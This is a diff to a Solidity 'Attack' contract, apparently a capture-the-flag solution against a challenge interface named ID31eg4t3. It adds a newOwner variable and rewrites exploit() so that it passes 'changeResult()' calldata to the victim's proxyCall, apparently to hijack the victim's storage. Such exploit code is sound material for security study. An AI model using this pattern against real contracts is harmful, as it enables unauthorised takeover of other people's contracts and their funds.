@@ -9,6 +9,7 @@ interface ID31eg4t3 {
 contract Attack {
     address internal immutable victim;
     bool public result;
+    address public newOwner;
 
     constructor(address addr) payable {
         victim = addr;
@@ -17,9 +18,9 @@ contract Attack {
     function changeResult() external {
         result = true;
     }
-
+    
     function exploit() external {
-        bytes memory data = abi.encodeWithSelector(ID31eg4t3.changeResult.selector, "");
+        bytes memory data = abi.encodeWithSignature("changeResult()");
         ID31eg4t3(victim).proxyCall(data);
     }
 }
